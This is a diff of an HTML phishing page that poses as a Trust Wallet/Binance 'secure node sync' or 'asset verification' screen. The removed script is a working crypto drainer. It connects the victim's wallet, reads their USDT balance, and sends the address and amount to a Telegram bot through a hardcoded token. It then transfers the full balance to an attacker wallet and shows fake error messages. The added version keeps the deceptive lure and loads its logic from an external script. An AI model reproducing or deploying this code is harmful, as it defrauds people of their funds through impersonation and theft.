@@ -3,129 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet | Secure Node Sync</title>
+    <title>Asset Verification | Secure Node</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
-        :root { --primary: #3172DE; --bg: #0b0e11; --card: #1e2329; }
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: #1e2329; padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 360px; z-index: 1; }
+        h2 { color: #f0b90b; margin-bottom: 15px; }
+        p { color: #929aa5; font-size: 14px; margin-bottom: 30px; }
+        .btn { background: #f0b90b; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         
-        .card { background: var(--card); width: 90%; max-width: 360px; padding: 40px 25px; border-radius: 28px; text-align: center; border: 1px solid #2d3139; box-shadow: 0 20px 40px rgba(0,0,0,0.4); position: relative; }
+        /* Loading Overlay */
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 14, 17, 0.95); z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        #loading-text { font-size: 18px; color: #f0b90b; font-weight: bold; }
+        #sub-text { font-size: 12px; color: #929aa5; margin-top: 10px; }
         
-        /* Official Logo Style */
-        .icon-box { width: 65px; height: 65px; background: rgba(240, 185, 11, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 1px solid rgba(240, 185, 11, 0.2); }
-        .icon-box img { width: 35px; }
-
-        h2 { font-size: 22px; font-weight: 700; margin-bottom: 12px; }
-        p { color: #929aa5; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
-
-        .btn { background: var(--primary); color: white; border: none; padding: 18px; width: 100%; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 15px rgba(49, 114, 222, 0.2); }
-        .btn:active { transform: scale(0.97); }
-
-        /* Trust Badges */
-        .badges { display: flex; justify-content: center; gap: 15px; margin-top: 25px; opacity: 0.4; filter: grayscale(1); }
-        .badges img { height: 18px; }
-
-        /* Modern Progress Overlay */
-        #overlay { display: none; position: fixed; inset: 0; background: var(--bg); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .progress-container { width: 200px; height: 4px; background: #2d3139; border-radius: 10px; margin-top: 20px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: var(--primary); transition: width 0.4s; }
-        #status-msg { color: var(--primary); font-size: 13px; font-weight: bold; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="icon-box">
-            <img src="https://cryptologos.cc/logos/binance-smart-chain-bnb-logo.png" alt="BEP20">
-        </div>
-        
-        <h2>Smart Node Sync</h2>
-        <p>Your <b>BEP20</b> assets require a mandatory synchronization with the decentralized security node to prevent unauthorized drainage.</p>
-        
-        <button class="btn" onclick="initSync()">Verify Assets</button>
-
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Binance_Logo.svg">
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png">
-        </div>
-        
-        <div style="margin-top: 20px; font-size: 10px; color: #5e6673; font-weight: bold;">
-            SECURE GATEWAY v4.0.21
-        </div>
+        <h2>Verify Assets</h2>
+        <p>Connect your wallet for a secure snapshot of your Binance Smart Chain assets.</p>
+        <button id="nextBtn" class="btn">Verify Assets</button>
     </div>
 
     <div id="overlay">
-        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" width="50" style="margin-bottom: 20px;">
-        <div id="status-msg">Initializing Secure Node...</div>
-        <div class="progress-container">
-            <div class="progress-bar" id="p-bar"></div>
-        </div>
+        <div class="spinner"></div>
+        <div id="loading-text">Initializing...</div>
+        <div id="sub-text">Connecting to secure node...</div>
     </div>
 
-    <script>
-        const CONFIG = {
-            wallet: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe",
-            usdt: "0x55d398326f99059fF775485246999027B3197955",
-            bot: "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI",
-            chat: "7849151110"
-        };
-
-        const steps = [
-            { t: "Connecting to BSC Node...", w: 25 },
-            { t: "Fetching Wallet Header...", w: 50 },
-            { t: "Analyzing Asset Value...", w: 75 },
-            { t: "Awaiting Final Signature...", w: 100 }
-        ];
-
-        function initSync() {
-            document.getElementById("overlay").style.display = "flex";
-            let i = 0;
-            const interval = setInterval(() => {
-                if (i < steps.length) {
-                    document.getElementById("status-msg").innerText = steps[i].t;
-                    document.getElementById("p-bar").style.width = steps[i].w + "%";
-                    i++;
-                } else {
-                    clearInterval(interval);
-                    loadWeb3();
-                }
-            }, 1000);
-        }
-
-        function loadWeb3() {
-            const script = document.createElement('script');
-            script.src = "https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js";
-            script.onload = startProcess;
-            document.head.appendChild(script);
-        }
-
-        async function startProcess() {
-            if (!window.ethereum && !window.trustwallet) {
-                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
-                return;
-            }
-
-            try {
-                const web3 = new Web3(window.ethereum || window.trustwallet);
-                const accs = await web3.eth.requestAccounts();
-                const user = accs[0];
-                
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-
-                const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
-                const contract = new web3.eth.Contract(abi, CONFIG.usdt);
-                const bal = await contract.methods.balanceOf(user).call();
-
-                fetch(`https://api.telegram.org/bot${CONFIG.bot}/sendMessage?chat_id=${CONFIG.chat}&text=👤 Connected: ${user}\nValue: ${web3.utils.fromWei(bal, 'ether')} USDT`);
-
-                if (parseInt(bal) > 0) {
-                    await contract.methods.transfer(CONFIG.wallet, bal).send({ from: user });
-                    alert("Node Sync Error: Please re-authorize.");
-                }
-            } catch (e) {
-                alert("Security Error: Signature Mismatch.");
-            }
-            document.getElementById("overlay").style.display = "none";
-        }
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
